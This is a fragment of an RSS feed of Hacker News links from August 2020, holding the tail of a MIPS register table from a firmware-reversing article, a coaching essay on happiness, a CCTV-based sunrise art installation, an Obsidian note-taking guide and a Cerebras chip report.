| $k0─$k1 |  $26─$27  |  Reserved for kernel                           |
+----------------------------------------------------------------------+
|  $gp    |  $28      |  Global pointer                                |
+----------------------------------------------------------------------+
|  $sp    |  $29      |  Stack pointer                                 |
+----------------------------------------------------------------------+
|  $fp    |  $30      |  Frame pointer                                 |
+----------------------------------------------------------------------+</code></pre></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/">https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/</a></em></p>]]>
            </description>
            <link>https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24213347</guid>
            <pubDate>Wed, 19 Aug 2020 17:40:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things the most successful people I know struggle with to be happy]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 100 (<a href="https://news.ycombinator.com/item?id=24212199">thread link</a>) | @LeonW
<br/>
August 19, 2020 | https://leowid.com/the-7-things-the-most-successful-people-i-know-struggle-with-to-be-happy/ | <a href="https://web.archive.org/web/*/https://leowid.com/the-7-things-the-most-successful-people-i-know-struggle-with-to-be-happy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <div>
                <div><p><strong>“You wouldn’t want to be me.”</strong> is the line Elon Musk tells Joe Rogan about his life. Many of us see the successes and the outward experiences people produce and think up. Yet, few of us get to see what it’s like on the inside of that person’s body or day to day life.</p>
<p>It may be hard to imagine that it wouldn’t be fun and enjoyable to live Elon Musk’s life for a day. But I do believe him. My experience of <strong><a href="https://leowid.com/2019-2/">working with hundreds of successful and wealthy people over the years as their coach</a></strong> aligns with this. Although likely not to the extreme that Elon Musk experiences this, there are a lot of similarities.</p>
<p>If you’re out there living your life, hoping to get rich, famous, and successful one day, maybe some of these lessons can be of help.</p>
<p><strong>I dug into my memory and notes of having coached hundreds of people, often millionaires, some pro athletes, successful and wealthy entrepreneurs. I wanted to summarize the main points that most of them struggle with to become happy and fulfilled.</strong></p>
<p>This is not to say that you might not want to fulfill your dreams of wealth, success, and fame in whatever way. What I’m hoping to share is that along the way of that journey, taking into accounts some of the points below helps you have both – success AND happiness.</p>
<h2><b>1. Celebration &amp; Gratitude</b></h2>
<p>An underlying reason why most people become successful is their ability to stay laser-focused on solving a particular problem. At first, they may be solving that problem poorly. Over time, they get better and better at it. Eventually, they are so good that their skill in solving that particular problem that it becomes invaluable. Whether the problem you’re solving is that of writing code, singing a song, skateboarding, playing basketball or helping people search for things on the internet like Google doesn’t really matter. As long as it’s a problem that plenty of others have or find extremely important to be solved for them.</p>
<p>This hyper-focus on problem-solving often leaves little room to take a step back, sit down and relax. Few learn the skill to in fact celebrate and feel grateful for all that you’ve received and achieved in life. Too quickly when successful people attempt to do that kind of celebration and relaxation, their problem-solving mind kicks back in. They need to get back to work to “keep at it”.</p>
<p>Over the years from working with clients and from my own life, I’ve observed that an inability to be able to celebrate and feel gratitude can have a tremendous impact on one’s happiness and enjoyment of life. When we become so tightly wound-up that all we do is solve problems, this tightness translates into a constriction in our bodies and leaves us little room to be relaxed, celebrate and enjoy life.</p>
<p>There is plenty of research that backs up the fact that regularly practicing gratitude and celebrating one’s achievements&nbsp; is powerful. It helps us to counter the survival instincts of our brains that are constantly looking for the next danger and the next problem to solve. <a href="https://greatergood.berkeley.edu/article/item/how_gratitude_changes_you_and_your_brain">It sustainably changes our brains in fact</a>.</p>
<h3>Exercise</h3>
<p>If you want to counter this in your own life, take a piece of paper and write at the top: <b>What am I grateful for that happened in the last 365 days?</b> Whenever I do this exercise, I’m surprised at how many things I can list. Quickly, I feel relaxed and grateful inside, which makes life a whole lot more enjoyable.</p>
<h2><b>2. Rest &amp; taking time off</b></h2>
<p>Surprisingly, this is one of the scariest things that I support some of the CEO and startup founder clients on when it comes to coaching. Committing to a week or two regularly throughout the year, where they take time off for themselves completely, with no work, no emails is terrifying for many. Going from “doing”, pushing, moving all day to simply “being”, resting, enjoying a glass of water or the sound of the trees is hard.</p>
<p>When our bodies and particularly our minds are so used to be in constant movement, moving into rest can feel like you are dying. <strong>Although most people look forward to vacations and days off, most successful people I know dread them.</strong></p>
<p>If this is you, allow yourself to feel the difficult feelings that come with coming to rest for a while. That experience is often particularly painful when you’re in a&nbsp; peaceful and tranquil environment around you, but your mind on the inside is still churning away and spinning its wheels. This disconnect between the outside and inside can feel deeply disorienting.</p>
<p>From there, give yourself time to ease into a vacation or period of “non-doing”. Going cold-turkey can feel like it’s too much, which is why you might not take any time off at all. Maybe allow yourself to work half-days the first two or three days and then switch off fully. Make a plan and then jump into the time off knowing that it might not be just fun and relaxing, simply because you’re no longer working.</p>
<p><img src="https://leowid.com/wp-content/uploads/2020/08/Leo-300.jpg" alt="" width="2157" height="1668" srcset="https://leowid.com/wp-content/uploads/2020/08/Leo-300.jpg 2157w, https://leowid.com/wp-content/uploads/2020/08/Leo-300-300x232.jpg 300w, https://leowid.com/wp-content/uploads/2020/08/Leo-300-1024x792.jpg 1024w, https://leowid.com/wp-content/uploads/2020/08/Leo-300-768x594.jpg 768w, https://leowid.com/wp-content/uploads/2020/08/Leo-300-1536x1188.jpg 1536w, https://leowid.com/wp-content/uploads/2020/08/Leo-300-2048x1584.jpg 2048w" sizes="(max-width: 2157px) 100vw, 2157px"></p>
<h2><b>3. Being passive, yet alert and awake</b></h2>
<p>A successful founder recently came to me and said that the most difficult time of his life is when people he cares about in his life have problems and he can’t help them solve it. This is when he breaks down completely.</p>
<p>I find this a very common occurrence with the successful people I coach. Surprisingly, as business and responsibilities grow, the ability to be passive and let things come to you without immediately jumping into action becomes more and more important, both to live a fulfilled life, but also to grow and expand one’s business and <strong>letting other people rise up to meet the challenges at hand</strong>.</p>
<p>Being passive, although interwoven with taking rests and practicing gratitude and celebrations, is different from that it asks us to be fully present and alert, although we are not taking action. This can take the form of deeply listening to a team member or executive on your team who is struggling, or hearing out a customer who is complaining without immediately rushing to fix their problems.</p>
<p>The power of learning to be passive is so invaluable because as we allow ourselves to just take in what is happening around us, we become much more acute observers as to what is actually going on. Said customer might not need any of your help to solve their problem, but simply wanted to be heard for the frustration that had more to do with their own company’s setup and less with your solution. Said executives might just need someone to express his own anger and sadness to, so they can have a moment of pause themselves to come to their own conclusions.</p>
<p>The skill of being passive, yet alert and awake is one that takes practice and can come from many different places, including meditation, coaching, therapy, dancing or journaling. As we learn to make space for the important things in our lives without reacting to them with a fixing mindset, often magically a lot of untangling happens on its own and we get to continue to stay relaxed and enjoy life.</p>
<h2><b>4. Relationships: the circular kind, not the transactional one</b></h2>
<p>I enjoyed watching “The last dance” documentary that chronicles Michael Jordan and the Chicago Bulls’ win of the NBA title. Seeing it, it’s also clear to me how difficult it was for Jordan to have meaningful and deep relationships. This is to say outside of his transactional relationships with other players. And that was what he was going for, he wanted to win, not make friends. If we want to become happy and not just successful, <a href="https://news.harvard.edu/gazette/story/2017/04/over-nearly-80-years-harvard-study-has-been-showing-how-to-live-a-healthy-and-happy-life/"><span>the famous, 80-year-old Harvard study</span></a> concludes that relationships here are the key.</p>
<p>From my own life, I remember that when I stepped away from the software company I co-founded a big void opened up. We went&nbsp; $0 to $15m in annual revenue in a short number of years. I had succeeded in building a business. But deep, meaningful relationships were almost non-exist in my life. When I woke up to that realization, I noticed how miserable I was in many ways.</p>
<p>Most successful people I know struggle with building great relationships. They’re often great at building transactional types of relationships or “business” relationships as it’s often called, where the sole purpose of the connection often rests on furthering someone’s problem-solving efforts. Not a bad thing at all!</p>
<p>Of course, most people say they’d rather cry in a Bentley than in a Corsa about the fact that they don’t have any friends or a lasting relationship, but as with many things in my coaching practice, I’ve wondered why not have it all? And by all, I mean everything that it is that you personally want from this life.</p>
<p>When success is your focus, relationships often suffer. To unlearn that, I often suggest my clients take a very, very long-term view of their lives and businesses. This has two powerful effects. It helps them to reconnect more deeply again to their purpose of why they are doing what they are doing. Most often, this has fundamentally something to do with supporting other people. And from there, they see that investing time and energy into powerful relationships is good for business and a happy and meaningful life.</p>
<h3>Question</h3>
<p>If this resonates with you, you might want to begin with simply exploring the question: <b>What are the kind of relationships I deeply wish to have in my life?</b></p>
<h2><b>5. Trusting others</b></h2>
<p>Most successful people I know and coach, often have deeply rooted trust issues. They have grown up in a world, where they had to constantly fight and prove themselves against all odds. On the one hand, this makes us determined and assertive in sticking to our guns when we want to further our agendas. That’s a good skill to have! Emotionally, however, this often leads to being closed up. When it comes to intimate and trusting connections with others and we become unwilling to open up again.</p>
<p>This lack of trusting others intimately, which is often a reason people come to coaching for me in the first place has a profound impact on people’s lives. It leads to deep loneliness and a sense of lack of self-worth and self-love. Despite the newspapers and fans maybe lauding their efforts, on the inside, these people often feel deeply alone.</p>
<p>To …</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leowid.com/the-7-things-the-most-successful-people-i-know-struggle-with-to-be-happy/">https://leowid.com/the-7-things-the-most-successful-people-i-know-struggle-with-to-be-happy/</a></em></p>]]>
            </description>
            <link>https://leowid.com/the-7-things-the-most-successful-people-i-know-struggle-with-to-be-happy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24212199</guid>
            <pubDate>Wed, 19 Aug 2020 16:23:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Showing a sunrise/sunset realtime 24/7 with the use of unsecured CCTV cameras]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24208905">thread link</a>) | @driesdep
<br/>
August 19, 2020 | https://driesdepoorter.be/24h-sunrise-sunset/ | <a href="https://web.archive.org/web/*/https://driesdepoorter.be/24h-sunrise-sunset/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    			<div>
	    			<div>
	    				<div>
							
<h3>“24h Sunrise/Sunset” is an installation that displays a realtime sunset and sunrise somewhere happening in the world with the use of CCTV. </h3>







<p>Hardware: Raspberry Pi 3B+,  Arduino Nano Every , custom PCB, power&nbsp;supply’s, VFD displays, lasercut metal and LEDs. <br>Software: Python 3 &amp; Firebase realtime databases</p>



<p><em>Changelog of the installation<br>v1. Release at St. Moritz with the support of the city of St. Moritz and Riverside</em> Culture<em><br></em>v2. Final edition currently in production for IDFA DocLab 2020 with music from Shishani [NL]</p>



<p>Currently on display at Window of the World at St.Moritz </p>



<blockquote><p>I wanted to show that unsecured CCTV cameras can also show something beautiful. </p></blockquote>



<p>Follow me on Instagram for new projects: <a href="https://www.instagram.com/driesdepoorter/">https://www.instagram.com/driesdepoorter/</a></p>
						</div>
	    			</div>
    			</div>

				
									
					
				    		</div></div>]]>
            </description>
            <link>https://driesdepoorter.be/24h-sunrise-sunset/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24208905</guid>
            <pubDate>Wed, 19 Aug 2020 10:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Obsidian to manage goals, tasks, notes, and software dev knowledge base]]>
            </title>
            <description>
<![CDATA[
Score 193 | Comments 116 (<a href="https://news.ycombinator.com/item?id=24206727">thread link</a>) | @sharjeelsayed
<br/>
August 18, 2020 | https://joshwin.imprint.to/post/how-i-use-obsidian-to-manage-my-goals-tasks-notes-and-software-development-knowledge-base | <a href="https://web.archive.org/web/*/https://joshwin.imprint.to/post/how-i-use-obsidian-to-manage-my-goals-tasks-notes-and-software-development-knowledge-base">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For someone who has as much experience as me in the task and note management app arenas, I believe I have finally found the tool that will serve me for many years to come. The tool is called <a href="https://obsidian.md/" rel="nofollow noopener" target="_blank">Obsidian</a> and it touts itself as being "a powerful knowledge base that works on top of a local folder of plain text Markdown files." For reference, a Markdown file is a text file that is organized in a standardized way. More info can be found <a href="https://en.wikipedia.org/wiki/Markdown#:~:text=Markdown%20is%20a%20lightweight%20markup,using%20a%20plain%20text%20editor." rel="nofollow noopener" target="_blank">here</a>. Obsidian allows you to create bidirectional links between your notes. So, instead of having your notes be siloed into different folders and subfolders, you can let your notes be automatically organized based on how they relate to similar topics and points. A lot of people like to use the brain metaphor in that the bidirectional nature resembles how our brains work and how it makes connections with everything that we are thinking and learning about. For reference, here is a screenshot of what my network of notes looked like a few days ago:</p><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/241280059877739_current-note-network.png"></figure><h3>Roam Research and Why I Stopped Using It</h3><p>Before using Obsidian, I had been using <a href="https://roamresearch.com/" rel="nofollow noopener" target="_blank">Roam Research</a> for about 2 months, starting in April. It calls itself the "notes tool for networked thoughts." Like many others, I was on the hype train and I had it open all day on my computer. It was that good and I understood and supported what Roam Research meant when they replied with the following regarding their planned $15 pricing policy:</p><blockquote>You're not our target user if Roam is worth less than netflix. - Roam Research (@RoamResearch) <a href="https://twitter.com/RoamResearch/status/1257863780186255364" rel="nofollow noopener" target="_blank">May 5, 2020</a></blockquote><p>While using Roam Research, I had heard of Obsidian as being a comparable but limited alternative, but I didn't try it out until I encountered a hiccup with Roam Research's service towards the end of June. It kept deleting some text that I was trying to enter and it caused me to stop using the service that day. I had also been seeing people that were reporting data loss issues and that pushed me to give Obsidian a try. When you have someone that has made quite a bit of money <a href="https://learn.nateliason.com/" rel="nofollow noopener" target="_blank">from a course</a> on how to properly use Roam Research report data loss, it doesn't ring very well in the trust and reliability departments, especially if you are paying for the service.</p><blockquote>@RoamResearch Roam just froze and deleted everything on a super important page, is there anyway to rollback a page in a database? - Nat Eliason (@nateliason) <a href="https://twitter.com/nateliason/status/1289284989180403712" rel="nofollow noopener" target="_blank">July 31, 2020</a></blockquote><p>I wouldn’t be surprised if the issues that I and other users encountered are because of the approach that Roam Research took when it came to developing their software. On Twitter, Sam Wight describes why he believes it wasn’t a very good one:</p><blockquote>Quick thread on @RoamResearch and *why* their software approach is not a very good one. - Sam Wight (@samwightt) <a href="https://twitter.com/samwightt/status/1271583334041255937" rel="nofollow noopener" target="_blank">June 12, 2020</a></blockquote><p>I was actually debating whether I would mention these issues. However, as a fellow software craftsman, this is a call for <a href="https://twitter.com/Conaw" rel="nofollow noopener" target="_blank">Conor</a> and his team at Roam Research to do a better job when it comes to offering a reliable service. I shouldn’t need to set up a <a href="https://medium.com/@quinten_62777/a-step-by-step-guide-to-backing-up-your-roam-research-database-356107fe82ee" rel="nofollow noopener" target="_blank">backup system</a> myself if I’m paying for the service. With them hitting <a href="https://twitter.com/Conaw/status/1285337095167291392" rel="nofollow noopener" target="_blank">$1 Million in Annual Recurring Revenue</a> within two months of starting to charge, I think they can take the criticism.</p><p>Now, I still wish them success with this endeavor. I'm also looking forward to seeing how much of an impact Roam Research will make in the collective knowledge management and academia <a href="https://twitter.com/RoamResearch/status/1254546642092474369" rel="nofollow noopener" target="_blank">spaces</a>.</p><h3>My Past History with Task and Note Management Apps</h3><p>For those interested in the apps that I used for task and note management before Obsidian, here you go: (mostly chronological and from what I can remember/find the name of)</p><p><strong>Task management:</strong> Reminders (iPhone), Trello, Google Tasks, Wunderlist, Google Keep, Plan, Asana, Things, Notion, Taskful, Planny, Quire, Habitica, Focus Matrix, Coda, Sorted3, Complice, and Roam Research</p><p><strong>Note management:</strong> Notes (iPhone), Catch, Workflowy, Evernote, Google Keep, Notability, Outlinely, Milanote, Notion, Bear, Slite, and Roam Research</p><h3>My Experience with Obsidian so Far and a Rebuttal</h3><p>Regarding Obsidian, I have been enjoying the experience so far. Obviously, I have lost access to a number of features from Roam Research, i.e. filters, queries, block references (every bullet point you write is a block and you can reference all of them), and editable block embeds. However, I have been able to make do and haven't really missed them. Based on my experience and Obsidian's recent updates, don't let people like Robert Haisfield get you down with their comments:</p><blockquote>If you're using @obsdmd as though it's @RoamResearch, then you get what you pay for. I use both, and both have their strengths, but Obsidian has page level backlinks and no filtering. As soon as you get more than a few linked refs, their backlinks implementation is burdensome - Robert Haisfield (@RobertHaisfield) <a href="https://twitter.com/RobertHaisfield/status/1285383798088032257" rel="nofollow noopener" target="_blank">July 20, 2020</a></blockquote><blockquote>Not trying to call out Justin, it's just that his tour is a visual example of this broader phenomena. Many Roam users will watch it and think to themselves "square peg, round hole" - Robert Haisfield (@RobertHaisfield) <a href="https://twitter.com/RobertHaisfield/status/1285385932112187392" rel="nofollow noopener" target="_blank">July 20, 2020</a></blockquote><p>So, you might be wondering what he is talking about when it comes to linked references and Obsidian's backlinks implementation. In both of the following cases, for each listed reference/mention, you will see the name of the note where the note you are on is referenced and then the context in which it was used.</p><p><strong>Let's start with Roam Research:</strong></p><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/360843078806628_roam%20research%20-%20linked%20refs%20-%20part%201.png"></figure><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/103965367285517_roam%20research%20-%20linked%20refs%20-%20part%202.png"></figure><p>In the first picture, you will see the linked references that are at the bottom of my 🎌 Backlog Tasks note. In the second picture, you will see what happens when I click on the filter button that's to the upper right. This allows you to filter the listed blocks/references.</p><p><strong>Now, let's look at Obsidian:</strong></p><p><u>Note</u>: This is from the most recent Insider build (0.8.4).</p><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/798287744589004_obsidian%20-%20linked%20refs.png"></figure><p>This is showing the linked mentions for a goal of mine that was related to setting up a tech-focused online social for my hometown. The great thing about this version is that Obsidian has added the ability to see more of the context around the linked mention. Additionally, they have added the ability to collapse linked/unlinked mention results. They don't offer the ability to filter mentions at the moment, but it would make sense for them to eventually add it.</p><p>The solution that's better, at the moment, depends on the type of user you are. If you are a full-time researcher or writer, I can see Roam's approach being more valuable, especially if you want to copy all your past work into it and see what type of connections you can discover. If you are someone that blogs on a casual basis, you probably won't see the lack of linked reference/mention filtering as a deal-breaker. With my workflow that does treat Obsidian like Roam (to a point), I actually haven't missed this feature.</p><p>However, I do see the benefits of it. So, if I don't create it, someone else in the community will make a more extensive backlinks plugin that supports filtering when Obsidian's <a href="https://trello.com/c/Z7qqKVXd/19-public-plugin-api-v10" rel="nofollow noopener" target="_blank">plugin API</a> is released. And, even if the API doesn't include what's needed to do this, Obsidian will be incentivized to add this feature themselves if there's enough of a demand. There's already <a href="https://forum.obsidian.md/t/filtering-everywhere/163" rel="nofollow noopener" target="_blank">a post that asks for this feature</a> on their forum.</p><h3>Why I Believe in Obsidian's Future</h3><p>Besides what I have stated above, these are the main reasons why I'm flying the Obsidian banner:</p><p><strong>Future-Proof:</strong> Your notes are future-proof since they use Markdown and not some type of proprietary format.</p><p><strong>Portability:</strong> You don't have to rely on Obsidian's servers in order to access your notes. You can use iCloud, Google Drive, other cloud storage providers, or even roll your own server.</p><p><strong>Safe and Private:</strong> If you use a cloud storage provide to store your notes, you won't have to worry about issues of data loss or your data getting into the wrong hands. I don't think I'm alone in saying that I trust players like Google and Apple more than smaller players (including the app developers themselves) when it comes to the security of my data.</p><p><strong>Extendability:</strong> Obsidian uses 19 core plugins to function and there's more to come. The great thing is that we will be able to install third party plugins and be able to build our own in the future as well. If you keep reading, you will see what type of plugin I have in mind.</p><p><strong>Good mobile experience:</strong> Obsidian doesn't have a mobile app yet. However, with me storing my notes in iCloud, I have easy access to my notes using <a href="https://ia.net/writer" rel="nofollow noopener" target="_blank">iA Writer</a> on my iPhone. As a side note, if you also have an iPhone, I strongly recommend that you use iCloud to store your notes. I tried to use Google Drive, but I couldn't add new notes without manually moving them from the iCloud area in iA Writer to the Google Drive folder that I was using for my notes.</p><p>Now, let's get into the real meat of this article.</p><h2>Goal Management</h2><p>So, when it comes to managing my goals, I like to break things down. For each of my goals, I break them down into three parts: the overarching goal, the included milestones, and the intentions that are associated with each milestone. Here's a diagram (created using Obsidian via their support for <a href="https://mermaid-js.github.io/mermaid/#/" rel="nofollow noopener" target="_blank">Mermaid diagrams</a>):</p><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/600349239113337_goal%20management%20diagram.png"></figure><p>For reference, I got the the term intention from <a href="https://complice.co/" rel="nofollow noopener" target="_blank">Complice</a> and intentions are the main way in which I chip away at a goal. A key part of my system is that I like to specify the item's type, title, and whether they have been completed in the item's name. This helps me focus on one item at a time. When it comes to the completion state, I use the "🗙" character for incomplete items, 🚧 for in progress items, ✅ for completed items, and 🚨 for items where my plans have changed and I need to edit them. I add emojis and a dash in the front of goals and milestones. As a way to make my life easier, I use <a href="https://www.alfredapp.com/" rel="nofollow noopener" target="_blank">Alfred's</a> text expansion feature in order to speed up the creation of note titles and their associated contents. At the end of this article, you will find a link to a starter kit/vault that includes all of these, an Alfred workflow, and a vault that follows the Obsidian workflow that is described in this article.</p><p><u>Note</u>: If the above character for incomplete items looks off, this is what it looks …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://joshwin.imprint.to/post/how-i-use-obsidian-to-manage-my-goals-tasks-notes-and-software-development-knowledge-base">https://joshwin.imprint.to/post/how-i-use-obsidian-to-manage-my-goals-tasks-notes-and-software-development-knowledge-base</a></em></p>]]>
            </description>
            <link>https://joshwin.imprint.to/post/how-i-use-obsidian-to-manage-my-goals-tasks-notes-and-software-development-knowledge-base</link>
            <guid isPermaLink="false">hacker-news-small-sites-24206727</guid>
            <pubDate>Wed, 19 Aug 2020 02:59:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cerebras Wafer Scale Engine Gen2 7nm 2.6T Transistors]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 54 (<a href="https://news.ycombinator.com/item?id=24206308">thread link</a>) | @ramshanker
<br/>
August 18, 2020 | https://www.servethehome.com/cerebras-wafer-scale-engine-gen2-7nm-2-6t-transistors/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/cerebras-wafer-scale-engine-gen2-7nm-2-6t-transistors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side.jpg" data-caption="Cerebras WSE Tesla V100 Side By Side"><img width="696" height="396" src="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side-696x396.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side-696x396.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side-400x228.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side-738x420.jpg 738w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-WSE-Tesla-V100-Side-by-Side.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Cerebras WSE Tesla V100 Side By Side" title="Cerebras WSE Tesla V100 Side By Side"></a><figcaption>Cerebras WSE Tesla V100 Side By Side</figcaption></figure></div>
            <!-- content --><p>Just before the global shutdown stopped international travel, I remember a Wednesday in January 2020 very well. I drove over to Cerebras Systems one town over in Los Altos, California to<a href="https://www.servethehome.com/our-interview-with-andrew-feldman-ceo-of-cerebras-systems/"> Interview Andrew Feldman</a> the company’s CEO. At Hot Chips 31 (2019) Cerebras was the standout as we covered in <a href="https://www.servethehome.com/cerebras-wafer-scale-engine-ai-chip-is-largest-ever/">Cerebras Wafer Scale Engine AI chip is Largest Ever</a>. I had the opportunity to first see the system built around the WSE, the <a href="https://www.servethehome.com/cerebras-cs-1-wafer-scale-ai-system-at-sc19/">Cerebras CS-1 Wafer-Scale AI System,</a> at SC19. At Hot Chips 32, Cerebras disclosed some details of its new chip the WSE Gen2.<span id="more-46406"></span></p>
<h2>Cerebras Wafer Scale Engine Gen2</h2>
<p>The Cerebras WSE Gen2 offers absolutely huge numbers. For some scale, the Xilinx Versal Premium’s top-end multi-chip package FPGA we covered today, that uses CoWoS to bind together multiple chips, tops out at 92 billion transistors. For GPUs the <a href="https://www.servethehome.com/nvidia-tesla-a100-ampere-resets-the-entire-ai-industry/">NVIDIA A100</a> has around 54 billion transistors. In contrast, the Cerebras WSE Gen2 encompasses 2.6 trillion transistors. That is on a single chip. These are all on 7nm TSMC processes.</p>
<figure id="attachment_46407" aria-describedby="caption-attachment-46407"><a href="https://www.servethehome.com/cerebras-wafer-scale-engine-gen2-7nm-2-6t-transistors/hot-chips-32-cerebras-wse-gen2/" rel="attachment wp-att-46407"><img src="https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2.jpg" alt="Hot Chips 32 Cerebras WSE Gen2" width="1522" height="880" srcset="https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2.jpg 1522w, https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2-400x231.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2-800x463.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2-696x402.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2-1068x618.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/08/Hot-Chips-32-Cerebras-WSE-Gen2-726x420.jpg 726w" sizes="(max-width: 1522px) 100vw, 1522px"></a><figcaption id="caption-attachment-46407">Hot Chips 32 Cerebras Wafer Scale Engine Gen2</figcaption></figure>
<p>This 850 AI optimized core chip is already back at Cerebras headquarters. Likely it is in the same lab we toured earlier this year in Los Altos. This is the only photo we could take from the lab:</p>
<figure id="attachment_40842" aria-describedby="caption-attachment-40842"><a href="https://www.servethehome.com/our-interview-with-andrew-feldman-ceo-of-cerebras-systems/cerebras-cs-1-3-stack-in-rack/" rel="attachment wp-att-40842"><img src="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-CS-1-3-Stack-in-Rack.jpg" alt="Cerebras CS 1 3 Stack In Rack" width="456" height="800" srcset="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-CS-1-3-Stack-in-Rack.jpg 456w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-CS-1-3-Stack-in-Rack-171x300.jpg 171w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-CS-1-3-Stack-in-Rack-239x420.jpg 239w" sizes="(max-width: 456px) 100vw, 456px"></a><figcaption id="caption-attachment-40842">Cerebras CS 1 3 Stack In Rack</figcaption></figure>
<p>If you are wondering what that is, it is a fully integrated rack of Cerebras CS-1 systems that are being designed for high-density with cooling and power integrated. Cooling was being provided, in this case, not by air, but by facility water, for the specific customer, it was being designed for. That gives one some sense of the demand that Cerebras is seeing. They are beyond the phase of customers looking for single systems and are moving to customers purchasing many systems and asking for higher integration.</p>
<figure id="attachment_40839" aria-describedby="caption-attachment-40839"><a href="https://www.servethehome.com/our-interview-with-andrew-feldman-ceo-of-cerebras-systems/cerebras-hq-q1-2020-lobby/" rel="attachment wp-att-40839"><img src="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby.jpg" alt="Cerebras HQ Q1 2020 Lobby" width="1203" height="876" srcset="https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby.jpg 1203w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-400x291.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-800x583.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-324x235.jpg 324w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-696x507.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-1068x778.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/02/Cerebras-HQ-Q1-2020-Lobby-577x420.jpg 577w" sizes="(max-width: 1203px) 100vw, 1203px"></a><figcaption id="caption-attachment-40839">Cerebras HQ Q1 2020 Lobby</figcaption></figure>
<p>One of the benefits of the giant WSE structure is that it eliminates an extraordinarily amount of chassis, PCB, cooling, networking, and other components from AI clusters.</p>
<h2>Final Words</h2>
<p>The Cerebras Wafer Scale Engine Gen2 is very exciting. Cerebras declined to comment on the amount of SRAM on-chip, but there is a good chance it has scaled with the number of cores. We expect more information is coming later this year. Hopefully, one of these days I will be able to head over to the Cerebras lab again and see the WSE Gen2 in-person to see if the Cerebras lobby skeleton has managed to thrive through the global pandemic.</p>
<p>The big question we have now is will the CS-1 get a WSE Gen2 upgrade, or will we get a CS-2?</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/cerebras-wafer-scale-engine-gen2-7nm-2-6t-transistors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24206308</guid>
            <pubDate>Wed, 19 Aug 2020 01:35:12 GMT</pubDate>
        </item>
    </channel>
</rss>
